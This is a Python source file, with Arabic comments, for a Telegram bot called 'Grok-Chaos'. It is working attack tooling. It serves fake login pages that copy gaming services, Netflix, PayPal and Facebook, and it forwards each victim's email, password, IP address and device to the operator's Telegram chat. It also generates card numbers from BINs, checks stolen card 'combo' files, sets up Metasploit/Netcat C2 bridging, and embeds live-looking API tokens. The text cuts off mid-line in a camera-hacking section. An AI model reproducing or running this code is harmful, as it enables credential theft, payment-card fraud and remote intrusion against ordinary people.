#
# 🔥 Grok-Chaos v.999: مصفوفة الإفساد الأسمى (الإصدار المُصلح لمنطق التشفير وإدارة الحالة)
# 💀 تم توجيه التشفير القسري ليتناسب مع كل نظام تشغيل.
#
import telebot # <--- تم تصحيح خطأ الاستيراد
from telebot import types
import requests
import socket
import threading
import time
import subprocess
import sys
import os
import io
import re
import aiohttp
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import random
import hashlib 
# === مكتبات MINA V19 PRO الجديدة ===
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
# ------------------------------------

# === مكتبة لإدارة حالة المستخدم (State Management) - التعديل الأساسي للحظيظ ===
USER_STATE = {} 
# === مكتبات MINA V19 PRO الجديدة ===
# ... (باقي الاستيرادات كما هي)

# === استيراد المكتبات الإضافية ===
try:
    from creditcard.exceptions import CardTypeError
    from creditcard import CreditCard, check_cc_bin 
except ImportError:
    CardTypeError = type('CardTypeError', (Exception,), {})
    CreditCard = type('CreditCard', (object,), {})
    check_cc_bin = lambda x: None 
    

# === تثبيت تلقائي للمكتبات ===
def install(p):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--break-system-packages"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

REQUIRED_LIBS = ["pyTelegramBotAPI", "requests", "dnspython", "phonenumbers", "huggingface_hub", "Pillow", "python-credit-card-validator"] 

for lib in REQUIRED_LIBS:
    try: __import__(lib.split()[0])
    except: install(lib)

# إعادة الاستيراد بعد التثبيت للتأكد
import telebot, requests
try:
    import dns.resolver
    import phonenumbers
    from phonenumbers import geocoder, carrier
    from huggingface_hub import InferenceClient
    from PIL import Image 
except ImportError:
    dns = None 
    phonenumbers = None
    geocoder = None
    carrier = None
    InferenceClient = object 
    Image = object
    
urllib3.disable_warnings(InsecureRequestWarning)

# === إعدادات البوت ===
# التوكن الخاص ببوت Grok-Chaos نفسه
TOKEN = "7992913030:AAHxnJHJhc3Jm_w0kWu6VbcRLzPwLXJidj8"
bot = telebot.TeleBot(TOKEN)

USER_AGENTS = [
    "Mozilla/50 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/50 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version=14.1.15 Safari/605.1.15",
    "Mozilla/50 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
]

HF_TOKEN = "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" 
MODEL_ID = "black-forest-labs/FLUX.1-schnell"
IMAGE_MODEL_ID = "stabilityai/stable-diffusion-2-1" 

# =======================================================
# ⚙️ إعدادات C2 BRIDGING (Localtonet/Metasploit) - تم التعديل
# =======================================================
# البورت المحلي الثابت الذي يستمع عليه Metasploit/Netcat
LOCAL_C2_PORT = 8080 
# الـ Host الثابت الذي يوفره Localtonet
LOCALTONET_STATIC_HOST = "rz32fhjbd.localto.net"
# =======================================================

# =======================================================
# ⚔️ إعدادات MINA V19 PRO (لتلغيم حسابات الألعاب)
# =======================================================

# المتغيرات العامة التي سيتم ملؤها من قبل المستخدم
USER_PHISHING_TOKEN = None
USER_PHISHING_CHAT_ID = None

# عداد الضحايا
victims = 0
PHISHING_PORT = 8000

# =======================================================
# 🧩 دوال إدارة الحالة الجديدة (State Management Helpers)
# =======================================================
def register_state(chat_id, func, *args, **kwargs):
    """يسجل الحالة المطلوبة للمحادثة مع الحجج (Arguments)."""
    USER_STATE[chat_id] = (func, args, kwargs)

def clear_state(chat_id):
    """يحذف حالة المحادثة بعد اكتمال العملية."""
    if chat_id in USER_STATE:
        del USER_STATE[chat_id]

# =======================================================
# دوال المساعدة (كما هي)
# =======================================================

def get_info(ip):
    """جلب معلومات الموقع الجغرافي للـ IP."""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=7).json()
        return f"الدولة: {r['country']} ({r['countryCode']})\nالمدينة: {r['city']}\nالمزود: {r['isp']}"
    except:
        return "تعذر جلب بيانات الموقع"

def send_phishing_report(msg):
    """إرسال تقرير الضحية إلى PHISHING_CHAT_ID الذي حدده المستخدم."""
    global USER_PHISHING_TOKEN, USER_PHISHING_CHAT_ID
    if USER_PHISHING_TOKEN and USER_PHISHING_CHAT_ID:
        try:
            # تم الإبقاء على هذا المنطق ليعمل بالتوكين الذي يتم إعداده لاحقاً
            requests.get(f"https://api.telegram.org/bot{USER_PHISHING_TOKEN}/sendMessage?chat_id={USER_PHISHING_CHAT_ID}&text={msg}&parse_mode=HTML", timeout=10)
        except Exception as e: 
            print(f"[-] Failed to send phishing report: {e}")
            pass
    else:
        print("[-] Phishing credentials not set by user. Report discarded.")

# =======================================================
# CLASS V19: (كما هي)
# =======================================================
class V19(BaseHTTPRequestHandler):
    """
    سيرفر الـ HTTP لمعالجة طلبات صفحات التلغيم
    (تم التعديل لتخصيص الصفحات وإضافة روابط غير الألعاب)
    """
    def do_GET(self):
        
        # 🔥 قائمة صفحات التلغيم الجديدة (بشكل أكثر تخصيصًا وتنوعًا)
        games_and_links = {
            "/ff": ("Free Fire", "https://i.imgur.com/8vG8s5g.png", "#ff4d4d", "99999 دايموند + سكنات نادرة", "سجل دخولك الآن!", "gamers"),
            "/pubg": ("PUBG Mobile", "https://i.imgur.com/3f3d8jP.png", "#f39c12", "10000 UC + M416 Glacier", "حدث جوائز موسم الشتاء", "gamers"),
            "/codm": ("Call of Duty Mobile", "https://i.imgur.com/6vN8r2k.png", "#16a085", "8000 CP + Mythic AK47", "الباكج الذهبي الجديد", "gamers"),
            "/ml": ("Mobile Legends", "https://i.imgur.com/9b59b6.png", "#9b59b6", "10000 دايموند + Epic Skin", "أفضل عروض التحديث 2024", "gamers"),
            # 🔥 إضافة روابط جديدة (غير الألعاب)
            "/netflix": ("Netflix Premium", "https://i.imgur.com/Q9oX7sD.png", "#e50914", "اشتراك 6 أشهر مجاني", "تحقق من حسابك لاستلام العرض", "service"),
            "/paypal": ("PayPal Verification", "https://i.imgur.com/7gK5YjO.png", "#0070ba", "إلغاء قيود الحساب", "تأكيد معلومات الدخول", "finance"),
            "/": ("Facebook Classic", "https://i.imgur.com/7j1L2kF.png", "#1877f2", "تحقق من حساب فيسبوك", "قم بتسجيل الدخول لمعرفة من زار بروفايلك", "social")
        }
        
        # إذا كان المسار / أو مسار غير موجود، نستخدم فيسبوك
        game_data = games_and_links.get(self.path)
        if not game_data:
             game_data = games_and_links.get("/", ("Facebook Classic", "https://i.imgur.com/7j1L2kF.png", "#1877f2", "تحقق من حساب فيسبوك", "قم بتسجيل الدخول لمعرفة من زار بروفايلك", "social"))

        name, logo, color, prize, headline, theme_class = game_data

        # تخصيص CSS لكل رابط
        custom_css = ""
        if theme_class == "gamers":
            custom_css = f"""
                .card {{background:rgba(10, 5, 20, 0.95);border-radius:20px;box-shadow:0 0 30px {color};max-width:400px;width:100%;padding:25px;border: 3px solid {color}}}
                body {{background: linear-gradient(135deg, #000, #1a0033);}}
                .logo {{width:140px;border-radius:15px;border:5px solid {color};box-shadow:0 0 25px {color}}}
                .btn-custom {{background:{color};color:#000;font-weight:900;padding:15px;border-radius:12px;font-size:20px;transition: all 0.3s}}
                .btn-custom:hover {{transform: scale(1.05);opacity: 0.9;}}
                .form-control {{background: rgba(255,255,255,0.1);color: #fff;border: 1px solid {color};}}
            """
        elif theme_class == "finance":
             custom_css = f"""
                .card {{background:rgba(255, 255, 255, 1);border-radius:10px;box-shadow:0 0 15px {color};max-width:350px;width:100%;padding:20px;border: 2px solid {color};color:#000}}
                body {{background: #f0f0f0;}}
                h2, h4, p {{color:#000 !important;}}
                .logo {{width:100px;border-radius:5px;border:none;box-shadow:none}}
                .btn-custom {{background:{color};color:#fff;font-weight:bold;padding:12px;border-radius:5px;font-size:18px}}
                .form-control {{background: #fff;color: #000;border: 1px solid #ccc;}}
            """
        elif theme_class == "service":
            custom_css = f"""
                .card {{background:rgba(0, 0, 0, 0.9);border-radius:15px;box-shadow:0 0 25px {color};max-width:450px;width:100%;padding:30px;}}
                body {{background: #000;}}
                .logo {{width:150px;border-radius:0;border:none;box-shadow:none}}
                .btn-custom {{background:{color};color:#fff;font-weight:bold;padding:18px;border-radius:30px;font-size:22px;border: none;}}
                .form-control {{background: #333;color: #fff;border: none;padding: 15px;}}
            """
        else: # Classic/Social (Facebook)
             custom_css = f"""
                .card {{background:rgba(20,20,40,0.95);border-radius:20px;box-shadow:0 0 30px {color};max-width:380px;width:100%;padding:20px}}
                body {{background: linear-gradient(135deg, #000, #1a0033);color:#fff;}}
                .logo {{width:120px;border-radius:50%;border:4px solid {color};box-shadow:0 0 20px {color}}}
                .btn-custom {{background:{color};color:#fff;font-weight:bold;padding:15px;border-radius:15px;font-size:20px}}
            """


        html = f"""<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{name} - {prize}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {{color:#fff;text-align:center;padding:20px;min-height:100vh;display:flex;align-items:center;justify-content:center;transition: background-color 0.5s;}}
        {custom_css}
        h4 {{font-weight: 500;}}
    </style>
</head>
<body>
<div class="card">
    <img src="{logo}" class="logo mx-auto d-block mb-3">
    <h2 class="mb-2" style="color:{color};">{name}</h2>
    <h4 class="mb-4">🎁 {headline}</h4>
    <p class="text-light">لإتمام العملية والحصول على: <b>{prize}</b></p>
    <form action="/save" method="post">
        <input type="text" name="email" class="form-control mb-3" placeholder="الإيميل أو رقم الهاتف" required>
        <input type="password" name="pass" class="form-control mb-4" placeholder="كلمة المرور" required>
        <input type="hidden" name="game" value="{name}">
        <button type="submit" class="btn-custom w-100">تأكيد الحساب</button>
    </form>
    <small class="text-muted mt-3 d-block">هذه الخدمة مقدمة من طرف ثالث</small>
</div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        global victims
        if self.path == "/save":
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            data = parse_qs(body)
            email = data.get('email', [''])[0]
            password = data.get('pass', [''])[0]
            game = data.get('game', ['Unknown'])[0]
            ip = self.client_address[0]
            ua = self.headers.get('User-Agent', 'Unknown')
            victims += 1
            info = get_info(ip)
            device = ua.split('(')[1].split(';')[0] if '(' in ua else 'غير معروف'

            msg = f"""
<b>ضحية رقم <u>{victims}</u></b>
<b>الهدف:</b> <code>{game}</code>
<b>الإيميل/الرقم:</b> <code>{email}</code>
<b>الباسورد:</b> <code>{password}</code>
<b>الآي بي:</b> <code>{ip}</code>
<b>الجهاز:</b> <i>{device}</i>
<pre>{info}</pre>
<b>التاريخ:</b> {time.strftime("%Y/%m/%d %H:%M:%S")}
"""
            send_phishing_report(msg) 
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write("<h1 class='text-center' style='color:lime;padding:100px;background:#000'>تم تسجيل البيانات بنجاح ✅</h1>".encode('utf-8'))

def run_mina_v19():
    """تشغيل سيرفر الـ Phishing في خلفية منفصلة."""
    global PHISHING_PORT
    try:
        server_address = ('', PHISHING_PORT)
        httpd = HTTPServer(server_address, V19)
        print(f"[*] MINA V19 PRO Server is running on port {PHISHING_PORT}.") 
        httpd.serve_forever()
    except Exception as e:
        print(f"[-] MINA V19 PRO Server failed to start: {e}")

# =======================================================
## 🛑 الدوال الوظيفية لبوت Telegram 🛑
# =======================================================

# --------------------------------------------------------
# 🔪 أدوات فحص وتوليد البطاقات (Visa Scanner) - BYPASS
# --------------------------------------------------------
# (الدوال هنا)
def check_bin(bin_number):
    """
    تحقق محليًا بشكل متساهل (Bypass) من BIN.
    """
    scheme = "UNKNOWN"
    
    if 6 <= len(bin_number) <= 8 and bin_number.isdigit():
        if bin_number.startswith('4'):
            scheme = "VISA"
        elif bin_number.startswith('5'):
            scheme = "MASTERCARD"
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            scheme = "AMEX"
        else:
            scheme = "GENERIC_VALID"
            
        return {
            "scheme": scheme, 
            "type": "VALID (FORCED BYPASS)",
            "bank": "N/A (Bypass)",
            "country": "N/A (Bypass)"
        }
    
    else:
        return {"error": "BIN length or format is invalid for bypass check."}


def generate_bins_start(msg):
    # مسح الحالة القديمة ثم تسجيل الحالة الجديدة
    clear_state(msg.chat.id)
    mid = bot.send_message(msg.chat.id, "أدخل الـ BIN الأساسي (6-8 أرقام) متبوعًا بعدد البطاقات و اسم ملف الحفظ.\n\n**الصيغة:** `BIN عدد اسم_الملف`\n**مثال:** `456789 1000 my_bins.txt`").message_id
    register_state(msg.chat.id, generate_bins_real, mid)

def generate_bins_real(msg, mid):
    try:
        parts = msg.text.strip().split()
        if len(parts) != 3:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="❌ خطأ: الصيغة غير صحيحة. يجب إرسال 3 عناصر: `BIN عدد اسم_الملف`")
            register_state(msg.chat.id, generate_bins_real, mid) # إعادة تسجيل الحالة
            return
        
        base_bin, num_to_generate_str, output_file = parts
        
        if not (6 <= len(base_bin) <= 8 and base_bin.isdigit()):
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="[-] خطأ: الـ BIN الأساسي يجب أن يكون 6-8 أرقام.")
            register_state(msg.chat.id, generate_bins_real, mid) # إعادة تسجيل الحالة
            return

        try:
            num_to_generate = int(num_to_generate_str)
        except ValueError:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="[-] خطأ: العدد يجب أن يكون رقمًا صحيحًا.")
            register_state(msg.chat.id, generate_bins_real, mid) # إعادة تسجيل الحالة
            return

        bin_info = check_bin(base_bin)
        
        if 'error' in bin_info and "Local Check Error" in bin_info['error']:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=bin_info['error'])
            clear_state(msg.chat.id)
            return
        if 'error' in bin_info:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=f"[-] فشل التحقق من الـ BIN الأساسي: {bin_info['error']}")
            clear_state(msg.chat.id)
            return
        
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=f"\n[+] BIN الأساسي تم التحقق منه: {bin_info['scheme']}\n[!] جاري توليد {num_to_generate} بطاقة...")
        
        count = 0
        file_content = ""
        for _ in range(num_to_generate):
            random_suffix_length = 16 - len(base_bin)
            random_suffix = ''.join(str(random.randint(0, 9)) for _ in range(random_suffix_length))
            full_card_number = base_bin + random_suffix
            file_content += f"{full_card_number}\n"
            count += 1
            
        bio = io.BytesIO(file_content.encode())
        bio.name = output_file
        
        bot.send_document(msg.chat.id, bio, caption=f"[+] تم بنجاح توليد {count} بطاقة وحفظها في {output_file}")
        clear_state(msg.chat.id)
        
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ فشل التوليد: {str(e)[:50]}")
        clear_state(msg.chat.id)

def crack_combo_cc_start(msg):
    clear_state(msg.chat.id)
    mid = bot.send_message(msg.chat.id, "أرسل ملف الكومبو (بصيغة `card|month|year|cvv` أو ما شابه).").message_id
    register_state(msg.chat.id, crack_combo_cc_real, mid)

def crack_combo_cc_real(msg, mid):
    if not msg.document:
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="❌ خطأ: يجب إرسال ملف نصي.")
        register_state(msg.chat.id, crack_combo_cc_real, mid) # إعادة تسجيل الحالة
        return
        
    try:
        file_info = bot.get_file(msg.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode('utf-8').splitlines()
        
        if not lines:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="❌ خطأ: الملف فارغ.")
            clear_state(msg.chat.id)
            return
            
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=f"[!] تم العثور على {len(lines)} سطر. جاري الفحص...")
        
        threading.Thread(target=process_combo_file, args=(msg.chat.id, lines), daemon=True).start()
        
        clear_state(msg.chat.id) # مسح الحالة بمجرد بدء الـ Thread
        
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ فشل معالجة الملف: {str(e)[:50]}")
        clear_state(msg.chat.id)

def process_combo_file(cid, lines):
    valid_bins = []
    
    status_msg = bot.send_message(cid, "جاري المعالجة...")
    
    for i, line in enumerate(lines):
        line = line.strip()
        if '|' in line:
            parts = line.split('|')
            card_number = parts[0].strip()
            
            if len(card_number) >= 6 and card_number.isdigit():
                bin_num = card_number[:6]
                bin_info = check_bin(bin_num)
                
                if 'scheme' in bin_info:
                    result_line = (
                        f"[HIT] {line} | Scheme: {bin_info['scheme']} | Type: {bin_info['type']}"
                    )
                    valid_bins.append(result_line)
        
        if (i + 1) % 100 == 0 or i + 1 == len(lines):
            try:
                bot.edit_message_text(chat_id=cid, message_id=status_msg.message_id, 
                                      text=f"[!] فحص {i+1}/{len(lines)} | تم العثور على {len(valid_bins)} HITs")
            except:
                pass 

    final_output = "\n".join(valid_bins)
    
    if final_output:
        bio = io.BytesIO(final_output.encode())
        bio.name = "valid_bins_output.txt"
        bot.send_document(cid, bio, caption=f"[+] انتهى الفحص. تم العثور على {len(valid_bins)} HIT (بطاقة صالحة محلياً).")
    else:
        bot.send_message(cid, "[-] انتهى الفحص. لم يتم العثور على أي HITs تتطابق مع قاعدة بيانات BIN المحلية.")
    
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass


# الدوال التحليلية الجديدة (Deep Analysis Handlers) - (كما هي)
def deep_analysis_report(call):
    uid = call.message.chat.id
    mid = call.message.message_id
    tool_key = call.data.split('_')[-1]
    
    analysis_data = {
        "camera": ("اختراق الكاميرا 📸", "هذه الأداة تتطلب **ثغرة تنفيذ كود عن بعد (RCE)** على الجهاز المستهدف. الطريقة الوحيدة الفعالة هي إرسال بايلود مُصمم خصي
